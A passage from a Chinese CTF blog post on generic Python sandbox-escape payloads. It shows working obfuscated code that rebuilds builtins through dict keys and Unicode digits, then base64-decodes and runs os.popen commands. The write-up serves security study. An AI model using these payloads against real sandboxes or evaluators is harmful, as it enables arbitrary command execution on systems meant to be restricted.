+<p>好在思路有了，只需要换一下库就行。<code>dict</code> 参数要求是合法的变量名，那么我们很容易想到 base64 里的字符大部分都是 <code>0-9a-zA-Z</code> 构成，还有特殊的字符 <code>=</code>、<code>/</code>、<code>+</code>。后面我们会挨个解决这三个字符的问题，先展示下 payload：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">[<span class="hljs-built_in">eval</span>][<br>    <span class="hljs-built_in">bool</span>(<br>        <span class="hljs-built_in">exec</span>(<br>            <span class="hljs-built_in">bytes</span>([<br>                <span class="hljs-built_in">ord</span>(j)<br>                <span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<br>                    <span class="hljs-built_in">list</span>(<br>                        <span class="hljs-built_in">open</span>(<br>                            <span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(base64=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))[<span class="hljs-number">23</span>:-<span class="hljs-number">2</span>]<br>                        )<br>                    )<br>                )[:-<span class="hljs-number">5</span>]<br>                <span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)<br>            ])<br>        )<br>    )<br>](<br>    b64decode(<br>        <span class="hljs-built_in">list</span>(<br>            <span class="hljs-built_in">dict</span>(X19pbXBvcnRfXygnb3MnKS5wb3BlbignaWQnKS5yZWFkKCkg=<span class="hljs-number">1</span>)<br>        )[<span class="hljs-number">0</span>]<br>    )<br>)<br></code></pre></td></tr></table></figure>
+<p>包含的命令为：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/5e5021d1-f99e-4f19-aea1-0f3e7571bd7c.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>更进一步，这个 payload 里除了 <code>eval</code>、<code>list</code>、<code>dict</code>、<code>for</code>、<code>in</code>、<code>数字</code> 之外其他常量/函数/关键字都不是必要的。都可以用 <code>eval</code> + <code>list</code> + <code>dict</code> 构造。所以这个 payload 可以变成这样：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">CMD = [<span class="hljs-built_in">eval</span>][<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_o_o_l=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(e_x_e_c=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_y_t_e_s=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])([<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(o_r_d=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(j)<span class="hljs-keyword">for</span>(i)<span class="hljs-keyword">in</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(o_p_e_n=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(s_t_r=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_1_1i1m1p1o1r1t1_1_=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_a_s_e_6_4=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>]))[<span class="hljs-number">23</span>:-<span class="hljs-number">2</span>])))[:-<span class="hljs-number">5</span>]<span class="hljs-keyword">for</span>(j)<span class="hljs-keyword">in</span>(i)])))](<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_6_4_d_e_c_o_d_e=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure>
+<p>至此，还有三个特殊字符需要解决：<code>=</code>、<code>/</code>、<code>+</code>。一旦 payload 经过 base64 编码之后出现这三个字符就没法当做 <code>dict</code> 的参数了。</p>
+<p>仔细回想一下小学 2 年级就学过的 base64 编码：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/8aec7b57-6e48-4e29-924e-79fbe76e3f5d.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>当红框里的二进制变成 <code>111111</code> 的时候，根据 base64 规范，此时应该编码为 <code>/</code>。这就要求原本的字符以 6 个 <code>1</code> 结尾，符合这种条件的 ascii 字符，只有一个：<code>?</code>。也就是说，只要位置为 3 的倍数上的字符是 <code>?</code>，那么编码后就会出现 <code>/</code>：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/ffef65e4-f472-4daa-8f76-afd392636688.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>知道原因之后，解决方式就很简单了：插入无关紧要的字符，挤走原本位于 3 倍数位置的 <code>?</code>。</p>
+<p>同理，编码后出现 <code>+</code> 可能的字符有 <code>&gt;</code>、<code>~</code>；编码后出现 <code>=</code> 的原因是源字符串长度不为 <code>=</code> 的倍数。这些都可以通过加无关紧要的字符来解决：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/9fde21ff-54a5-4506-8309-185cfe98ff8e.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h3 id="通解三">通解三</h3>
+<p>比较遗憾的是，上面这个 payload，当利用点处于函数内部的时候，由于 <code>exec</code> 生成的变量无法在函数上下文中使用，所以在执行模块源码的时候通常会报错。例如上面这个就会报 <code>name '_bytes_from_decode_data' is not defined</code>：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/bb1a9ea3-64f5-4a58-a542-345fd9b936c7.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>一开始我的思路是：能否寻找到一个库的源码，其中有一行 <code>__import__("binascii").a2b_base64</code>，如果有的话，我就可以通过切片切出来这一句话，然后用 <code>eval</code> 执行，参数可以通过 for 循环搞定：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/101ed2df-99b9-428d-a242-003d6d5483bf.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>但遗憾的是，经过一番搜索，并没有找到合适的标准库的源码可以用来执行导入解码模块的语句，要么就是存在多级目录，在无法判断 python 绝对路径的情况下，不实用。因此需要另寻它法。</p>
+<p>再经过一番探索，我发现 <code>vars()</code> 真是完美。它有一个可选参数，当没指定参数的时候，与 <code>locals()</code> 结果一致。当指定参数的时候，会获取参数所在命名空间的 <code>locals()</code>。所以我们可以先 <code>import binascii</code> ，在利用 <code>vars(binascii)</code> 取出里面的 <code>a2b_base64</code> 从而进行 base64 解码：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">vars</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_1_1i1m1p1o1r1t1_1_=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_i_n_a_s_c_i_i_=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>]))[<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(a_2_b1_1b_a_s_e_6_4=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>][::<span class="hljs-number">2</span>]](<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure></p>
+<p>相比上面的 payload 来说，它还不需要 <code>for</code>，非常纯净的通解。</p>
+<h3 id="通解四">通解四</h3>
+<p>再疯狂一点，如果把数字禁用了，如何？</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/e28159e6-237a-4e46-a517-e1a92e183983.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这就是《OrangeKiller CTF 第 3 期》中的第三道题。</p>
+<p>切片中的数字好说：</p>
+<ul>
+<li><code>0</code> -&gt; <code>len([])</code></li>
+<li><code>2</code> -&gt; <code>len(list(dict(aa=()))[len([])])</code></li>
+</ul>
+<p>由于我选用的是 <code>dict()</code>，参数里的数字应该如何绕过呢？答案还是 Unicode！可用的数字列表见：</p>
+<p>https://www.fileformat.info/info/unicode/category/Nd/list.htm</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/common-exp-of-python-jail/5c3e82f7-7d54-4f04-8929-eef61d679ace.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>所以，终极版的 payload 如下：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">vars</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(_a_aiamapaoarata_a_=()))[<span class="hljs-built_in">len</span>([])][::<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(aa=()))[<span class="hljs-built_in">len</span>([])])])(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(b_i_n_a_s_c_i_i_=()))[<span class="hljs-built_in">len</span>([])][::<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(aa=()))[<span class="hljs-built_in">len</span>([])])]))[<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(a_𝟤_b𝟣_𝟣b_a_s_e_𝟨_𝟦=()))[<span class="hljs-built_in">len</span>([])][::<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(aa=()))[<span class="hljs-built_in">len</span>([])])]](<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(X𝟣𝟫pbXBvcnRfXygnb𝟥MnKS𝟧wb𝟥BlbignZWNobyBIYWNrZWQ𝟨IGBpZGAnKS𝟧yZWFkKCkg=()))[<span class="hljs-built_in">len</span>([])])<br></code></pre></td></tr></table></figure></p>
+<p>其中需要用到的字符：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">In [<span class="hljs-number">5</span>]: <span class="hljs-built_in">set</span>(re.findall(<span class="hljs-string">&#x27;\w+&#x27;</span>, CMD))<br>Out[<span class="hljs-number">5</span>]:<br>&#123;<span class="hljs-string">&#x27;X𝟣𝟫pbXBvcnRfXygnb𝟥MnKS𝟧wb𝟥BlbignZWNobyBIYWNrZWQ𝟨IGBpZGAnKS𝟧yZWFkKCkg&#x27;</span>,<br> <span class="hljs-string">&#x27;_a_aiamapaoarata_a_&#x27;</span>,<br> <span class="hljs-string">&#x27;a_𝟤_b𝟣_𝟣b_a_s_e_𝟨_𝟦&#x27;</span>,<br> <span class="hljs-string">&#x27;aa&#x27;</span>,<br> <span class="hljs-string">&#x27;b_i_n_a_s_c_i_i_&#x27;</span>,<br> <span class="hljs-string">&#x27;dict&#x27;</span>,<br> <span class="hljs-string">&#x27;eval&#x27;</span>,<br> <span class="hljs-string">&#x27;len&#x27;</span>,<br> <span class="hljs-string">&#x27;list&#x27;</span>,<br> <span class="hljs-string">&#x27;vars&#x27;</span>&#125;<br><br>In [<span class="hljs-number">6</span>]: <span class="hljs-built_in">set</span>(re.findall(<span class="hljs-string">&#x27;\W&#x27;</span>, CMD))<br>Out[<span class="hljs-number">6</span>]: &#123;<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>构造脚本：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">u = <span class="hljs-string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span><br><br>CMD = <span class="hljs-string">&quot;eval(vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=()))[len([])]))&quot;</span><br><br>CMD = CMD.translate(&#123;<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>(i)): u[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)&#125;)<br></code></pre></td></tr></table></figure>
+<p>最后，像 <code>eval</code> 这种，直接用 Unicode 就可以解决，我就不啰嗦了，之前都说过的。</p>
+<p>coooooooooooool~</p>
+<h2 id="总结">总结</h2>
+<p>OrangeKiller CTF 第 3 期 所需的知识点，其实都在这篇文章里了，我就不啰嗦了。</p>
+<p>这篇写完之后顿觉神清气爽。现在 CTF 中的 Python 题还是比较简单的 —— Web 题似乎还是 PHP 的天下。什么时候 Python 也能像 PHP 这样被人探索出各种奇妙的利用呢？本文的姿势似乎尚未有前人探索，或许也算为 Python 的奇技淫巧共享出属于自己的一小份力量了。</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">提前祝橘友们国庆快乐！</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Python/">#Python</a>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Python 沙箱逃逸的通解探索之路</div>
+      <div>https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年9月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/31/2022/" title="2022 年度总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022 年度总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/26/OrangeKiller_CTF_3/" title="OrangeKiller CTF 第 3 期">
+                        <span class="hidden-mobile">OrangeKiller CTF 第 3 期</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
